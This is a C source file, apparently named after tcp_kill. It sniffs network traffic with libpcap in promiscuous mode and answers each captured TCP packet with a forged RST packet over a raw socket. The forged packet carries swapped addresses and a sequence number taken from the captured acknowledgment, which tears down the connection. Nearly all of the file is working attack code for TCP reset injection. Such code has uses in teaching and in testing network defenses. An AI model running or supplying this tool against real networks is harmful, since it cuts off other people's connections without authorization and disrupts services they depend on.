#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <time.h>

#include "tcp_kill.h"
#include "header.h"
#include "dns.h"

int main(int argc, char *argv[])
{

	//select a device
	char *dev_name = select_device();

	//create the handle
	pcap_t *handle = create_handle(dev_name);

	//set the filter
	set_filter(handle, dev_name);
	printf("Device %s is opened. Begin sniffing with filter %s...\n", dev_name, FILTER);

	//creating the raw socket fd
	fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	int hincl = 1; /* 1 = on, 0 = off */
	setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

	if (fd < 0)
	{
		perror("Error creating raw socket ");
		exit(EXIT_FAILURE);
	}

	//setting the destination addr
	memset(&to, '0', sizeof(struct sockaddr_in));

	//setting the size of packets to send
	sizeofpacket = sizeof(struct iphdr) + sizeof(struct tcphdr);

	//Put the device in sniff loop
	pcap_loop(handle, -1, process_packet, NULL);

	pcap_close(handle);

	return 0;
}

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer)
{

	int size = header->len;

	//Finding the beginning of IP header
	struct iphdr *in_iphr;

	u_int8_t *radiotap_header_length = (u_int8_t *)(buffer + 2);

	switch (HEADER_TYPE)
	{
	case LINKTYPE_ETH:
		in_iphr = (struct iphdr *)(buffer + sizeof(struct ethhdr)); //For ethernet
		size -= sizeof(struct ethhdr);
		break;

	case LINKTYPE_NULL:
		in_iphr = (struct iphdr *)(buffer + 4);
		size -= 4;
		break;

	case LINKTYPE_WIFI:
		in_iphr = (struct iphdr *)(buffer + 34 + *radiotap_header_length);
		size -= 55;
		break;

	case DLT_LINUX_SLL:
		in_iphr = (struct iphdr *)(buffer + 16);
		size -= 16;
		break;

	default:
		fprintf(stderr, "Unknown header type %d\n", HEADER_TYPE);
		exit(EXIT_FAILURE);
	}

	if (in_iphr->ihl != 5 || in_iphr->version != 4)
	{
		printf("Error parsing the packet");
		printf("Packet not processed");
		return;
	}

	struct tcphdr *tcp_buff = (struct tcphdr *)(in_iphr + 1);

	u_int32_t source_ip = in_iphr->daddr;
	u_int32_t dest_ip = in_iphr->saddr;

	u_int16_t source_port = tcp_buff->dest;
	u_int16_t dest_port = tcp_buff->source;

	//building the RES packet
	char *packet = malloc(65536 * sizeof(char));
	memset(packet, 0, 65536);

	//IP header pointer
	struct iphdr *iph = (struct iphdr *)packet;

	//TCP header pointer
	struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

	//fill the IP header here
	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->frag_off = 0;
	iph->ttl = 150;
	iph->protocol = 6;
	iph->check = 0;
	iph->saddr = source_ip;
	iph->daddr = dest_ip;
	iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
	iph->id = htons(12345);

	iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));

	//filling the TCP header
	tcph->source = source_port;
	tcph->dest = dest_port;
	tcph->seq = tcp_buff->ack_seq;
	tcph->ack_seq = 0;
	tcph->res1 = 0;
	tcph->doff = 5;
	tcph->fin = 0;
	tcph->syn = 0;
	tcph->rst = 1;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->res2 = 0;
	tcph->window = 0;
	tcph->urg_ptr = 0;

	//fill the TCP pseudo header
	struct pseudo_tcp_header psh; //pseudo header

	memset(&psh, 0, sizeof(struct pseudo_tcp_header));

	psh.dest_address = dest_ip;
	psh.source_address = source_ip;
	psh.protocol = 6;
	psh.tcp_length = htons(sizeof(struct tcphdr));
	psh.placeholder = 0;

	//filling the TCP header checksum
	char *checkstr;
	checkstr = malloc(sizeof(struct pseudo_tcp_header) + sizeof(struct tcphdr));
	memcpy(checkstr, (char *)&psh, sizeof(struct pseudo_tcp_header));
	memcpy(checkstr + sizeof(struct pseudo_tcp_header), (char *)tcph, sizeof(struct tcphdr));

	tcph->check = checksum((unsigned short *)checkstr, sizeof(struct pseudo_tcp_header) + sizeof(struct tcphdr));

	/************** send out using raw IP socket************/
	to.sin_family = AF_INET;
	to.sin_addr.s_addr = dest_ip;
	to.sin_port = dest_port;

	int n = sendto(fd, packet, sizeofpacket, 0, (struct sockaddr *)&to, sizeof(struct sockaddr));
	if (n < 0)
	{
		perror("Error sending the packet");
	}

	printf("Packet sent \r");
	printf("\n");
}

pcap_t *create_handle(char *dev_name)
{
	pcap_t *handle;
	char err_buf[PCAP_ERRBUF_SIZE];

	//Create the handle
	if (!(handle = pcap_create(dev_name, err_buf)))
	{
		printf("Pcap create error : %s", err_buf);
		exit(EXIT_FAILURE);
	}

	if (pcap_set_promisc(handle, SET_PROMISC))
		pcap_perror(handle, "Error while setting promiscuous mode");

	//Setting immediate mode
	if (pcap_set_immediate_mode(handle, 1))
		pcap_perror(handle, "Pcap set immediate mode error");

	//Activating the sniffing handle
	if (pcap_activate(handle))
		pcap_perror(handle, "Pcap activate error");

	int *dlt_buf;

	int num = pcap_list_datalinks(handle, &dlt_buf);
	for (int i = 0; i < num; i++)
	{
		printf("%d - %s - %s \n", dlt_buf[i], pcap_datalink_val_to_name(dlt_buf[i]), pcap_datalink_val_to_description(dlt_buf[i]));
	}

	// the the link layer header type
	// see http://www.tcpdump.org/linktypes.html
	HEADER_TYPE = pcap_datalink(handle);

	return handle;
}

void set_filter(pcap_t *handle, char *dev_name)
{
	struct bpf_program fp;
	char err_buf[PCAP_ERRBUF_SIZE];

	if (pcap_compile(handle, &fp, FILTER, 0, 0) == -1)
	{
		printf("Couldn't parse filter %s: %s\n", FILTER, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}
	if (pcap_setfilter(handle, &fp) == -1)
	{
		printf("Couldn't install filter %s: %s\n", FILTER, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	if (handle == NULL)
	{
		printf("Unable to open device %s: %s\n", dev_name, err_buf);
		exit(EXIT_FAILURE);
	}
}

char *select_device()
{
	pcap_if_t *all_dev, *dev;
	char *dev_name;

	char err_buf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 net_ip, mask;

	//get all available devices
	if (pcap_findalldevs(&all_dev, err_buf))
	{
		printf("Unable to find devices: %s", err_buf);
		exit(EXIT_FAILURE);
	}

	if (all_dev == NULL)
	{
		printf("No device found. Please check that you are running with root \n");
		exit(EXIT_FAILURE);
	}

	printf("Available devices list: \n");
	int c = 1;

	for (dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);
		c++;
	}

	printf("Please choose the monitoring device (e.g., en0):\n");
	dev_name = malloc(20);
	fgets(dev_name, 20, stdin);
	*(dev_name + strlen(dev_name) - 1) = '\0'; //the pcap_open_live don't take the last \n in the end

	//look up the chosen device
	pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);

	struct sockaddr_in addr;
	addr.sin_addr.s_addr = net_ip;
	char ip_char[100];
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("NET address: %s\n", ip_char);

	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("Mask: %s\n", ip_char);

	return dev_name;
}